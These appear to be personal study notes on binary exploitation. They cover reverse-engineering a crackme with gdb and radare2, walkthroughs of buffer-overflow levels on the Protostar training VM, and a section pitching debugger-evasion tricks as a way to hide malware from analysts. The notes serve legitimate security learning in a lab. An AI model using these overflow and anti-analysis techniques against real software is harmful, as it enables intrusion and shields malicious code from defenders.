# Binary Exploitation

### Assembly Language (Basics)

Practice on : https://microcorruption.com/debugger/New%20Orleans

Read basic instructions in assembly like :

- compare
- jump
- add
- move
- subtract
- goto
- push
- pop

.... etc.

Focus on Memory and Stack instructions

### Cracking a Binary

Github Link : https://github.com/LiveOverflow/liveoverflow_youtube/tree/master/0x05_simple_crackme_intro_assembler

Download the resources

```bash
wget https://raw.githubusercontent.com/LiveOverflow/liveoverflow_youtube/master/0x05_simple_crackme_intro_assembler/gdb_disassembly
wget https://raw.githubusercontent.com/LiveOverflow/liveoverflow_youtube/master/0x05_simple_crackme_intro_assembler/license_1.c

### After getting compile the binary

gcc license_1.c -o license
```

It's a simple program which checks if a license is valid or not by taking a input as an argument.
To see binary assembly code

```bash
gdb "binary_name"
```

Always set the view as : set disassembly-flavor intel
To disassemble a function : disassemble "func_name"

Analyse the assembly Code -> :)

**GDB Commands :**

- break (star)"point_where_to_break" : Eg, break \*main
- info registers : To get the info about the basic memory layout
- si : to go through the code by instruction wise and stopping each time
- ni : to go through the code by executing the function first and then stopping on the first instruction
- run / run "args" : to start the program
- set "memory_pointer" : Eg, set $eax=0, This will set the eax pointer to 0

**Tools :**

- radare2
- Hopper Disassembler
- strings
- objdump
- hexdump

**Radare 2 Commands :**

```bash
r2 binary_name
```

- aaa : to analyse all the functions
- afl : to analyse and list the functions
- ? : to get the help menu for commands
- pdf : to display the disassembled code of a function
- s "func/point" : this will set the address to what we are giving as input to point. Eg, s sym.main
- VV : To get graphical view / control graph

### Let's try to make our code more safe

Step 1 : let's not store the string as it is in the code
Step 2 : Compare the sum of ascii's of the input with the sum of the real key

Now our program is :

```C
#include <string.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
        if(argc==2) {
                printf("Checking License: %s\n", argv[1]);
                int sum = 0;
                for(int i = 0; i < strlen(argv[1]);i++){
                        sum += (int)argv[1][i];
                }
                if(sum == 916) {
                        printf("Access Granted!\n");
                } else {
                        printf("WRONG!\n");
                }
        } else {
                printf("Usage: <key>\n");
        }
        return 0;
}

```

Using Radare 2 analyse the compiled binary and getting the way to bypass checks.
Now making safe doesn't work so now we move to a new approach which is :

**USING A PARSER DIFFERENTIAL**

What is this and what it will do ?

-> Now as we know that we can run the binary in linux system and we can also pass it through gdb and radare2 to analyse but what if we can do something so that we will still be able to
run the binary but we aren't able to pass it through GDB and radare like softwares

Let's write a python script for achieving our goal.
**fuzzer.py** in 0x08 folder

Uses :

- We can use this fuzzing technique to hide the working of our malware and stop people from analysing it.
- To make the code uncrackable

The script above is not written in professional way but it gives us a glimpse of how the **Parser Differential** works.

More on this topic

- https://www.sentinelone.com/blog/breaking-and-evading/
- https://ioactive.com/striking-back-gdb-and-ida-debuggers/

**SysCalls** : Bridge between Kernel Mode and User Mode

## Now we need to practise our skills in binary exploitation

### Protostar

We need to download the VM from : https://exploit.education/downloads/

- Download Protostar
- Install it in virtual box

**Login Creds**

username : user
password : user

Machine Page : https://exploit.education/protostar/
All the binaries which need to be exploited can be found in **/opt/protostar/bin**

### Stack 0

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

1. Here we will now boot up the machine with given creds. It will look something like this
   <img src="./images/BE1.png"></img>

2. Navigate to /opt/protostar/bin

3. The code of binary is given to us and now analyse it with gdb
   <img src="./images/BE2.png"></img>
4. Let's understand the terminologies in the assembly code

```txt
POINTERS
--------

ebp = base pointer (it is at the bottom of the stack)
eip = instruction pointer
esp = stack pointer


INSTRUCTIONS
------------

call = this will put the address on the top of the stack
leave = this will pop all the local variable space in the stack
```

5. Now one thing we all know that never to use gets() function in c. It is dangerous.
6. Set the breakpoint of the program at the get instruction in the following asm program

```asm
0x0000555555555149 <+0>:     push   rbp
0x000055555555514a <+1>:     mov    rbp,rsp
0x000055555555514d <+4>:     sub    rsp,0x60
0x0000555555555151 <+8>:     mov    DWORD PTR [rbp-0x54],edi
0x0000555555555154 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
0x0000555555555158 <+15>:    mov    DWORD PTR [rbp-0x4],0x0
0x000055555555515f <+22>:    lea    rax,[rbp-0x50]
0x0000555555555163 <+26>:    mov    rdi,rax
0x0000555555555166 <+29>:    mov    eax,0x0
0x000055555555516b <+34>:    call   0x555555555040 <gets@plt>  <--- this is the gets instruction
0x0000555555555170 <+39>:    mov    eax,DWORD PTR [rbp-0x4]
0x0000555555555173 <+42>:    test   eax,eax                    <--- here it is comparing the variables to 0
0x0000555555555175 <+44>:    je     0x555555555188 <main+63>
0x0000555555555177 <+46>:    lea    rax,[rip+0xe8a]        # 0x555555556008
0x000055555555517e <+53>:    mov    rdi,rax
0x0000555555555181 <+56>:    call   0x555555555030 <puts@plt>        <--- print statements
0x0000555555555186 <+61>:    jmp    0x555555555197 <main+78>
0x0000555555555188 <+63>:    lea    rax,[rip+0xea2]        # 0x555555556031
0x000055555555518f <+70>:    mov    rdi,rax
0x0000555555555192 <+73>:    call   0x555555555030 <puts@plt>        <--- print statements
0x0000555555555197 <+78>:    mov    eax,0x0
0x000055555555519c <+83>:    leave
0x000055555555519d <+84>:    ret
```

**In GDB**

```sh
break *0x000055555555516b  # on gets
break *0x0000555555555170  # after gets
```

7. We will enter some commands for gdb to execute when we hit the break point we can do it by setting the hook-stop

```sh
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $eip
>end
```

Now every time we hit a break point we will get the registers info and we will get the next two instructions which will be executed after the breakpoint

8. Now restart the program using r and as soon we hit the breakpoint we get the registers with the values
   <img src="./images/BE3.png"></img>

9. Now continue (c) the program and enter bunch of A's and now observe the register values and we see that there are bunch of 0x41414141.
   These values are nothing but the A's we provided --> "A" = char(0x41)
   <img src="./images/BE4.png"></img>

10. To check the content of the register which is being compared to zero we will use

```sh
x/wx $esp+0x5c
# OUTPUT ->  0x000000000
```

11. Now we need to edit this but we need to count how many chars do we need to edit this. Let's count it from the output above and we will come to know that we need 64+ chars to edit our stack pointer $esp+0x5c

12. generate sting using python

```sh
python3 -c 'print("A"*70)'
```

Now copy and paste in gdb after restarting the execution

<img src="./images/BE5.png"></img>

13. And we have our result our pointer is edited to confirm check again using

```sh
x/wx $esp+0x5c
#OUTPUT -> 0x41414141
```

14. This kind of behavior is actually a vulnerability called **Buffer Overflow**

#### Now we have solved our first stack vulnerabity

### Stack 3

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

1. Boot up the machine with given credentials.
2. navigate to /opt/protostar/bin.
3. Run the stack3 binary to check the behavior.
4. Open the binary in gdb and analyse.
5. Disassemble the Code and Analyse the main and win function.
6. Now we need to know where our win() function lies in the memory so for that we will use :

```txt
(gdb) x win
```

7. This will give the address of the win() function.
8. Now after analysing the assembly output of the main function we are able to find that the value fp; is called as a function if it is not equal to zero.
9. Let's do some gdb stuff now

```txt
(gdb) break *(address_of_the_last_fp_call)
(gdb) r
---> After running provide input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) info registers

```

10. Now we can see that our register eax is 0x41414141, this is nothing else but the A's we provided.
11. Now we will write a simple script to know the offset till where our buffer is limited and where overflow is happening. (script in /stack3 directory) (script_name = "check_offset.py")
12. Now we will pip the output of the offset script in gdb and get the offset.

```txt
# compile the script and store the output
python /tmp/check_offset.py > /tmp/out

# Open the binary in gdb
(gdb) disassemble main
(gdb) break *(address_of_the_last_fp_call)
(gdb) r < /tmp/out
(gdb) info registers
```

<img src="./images/BE6.png"></img>

13. As we can see that our offset is at 0x51515151 exactly so this means that our buffer started to overflow when the letter Q appears so now create another script which will call our win function.
    (script in /stack3 directory) (script_name = "exploit.py")

```txt
(gdb) disassemble main
(gdb) break *(address_of_the_last_fp_call)
(gdb) r < /tmp/out
(gdb) info registers
```

<img src="./images/BE7.png"></img>

14. Now after piping the output to the binary in gdb we can see that our eax pointer is set to 0x08048424, therefore our next execution call will be win() function.

```txt
(gdb) c
```

<img src="./images/BE8.png"></img>

15. And we see our output as 'code flow successfully changed' we can confirm it using

```sh
python /tmp/exploit.py | ./stack3
```

VOILA, stack 3 binary is exploited.
Similarly stack4 can also be solved :)

### Stack 4

Solved !! scripts in directory stack4
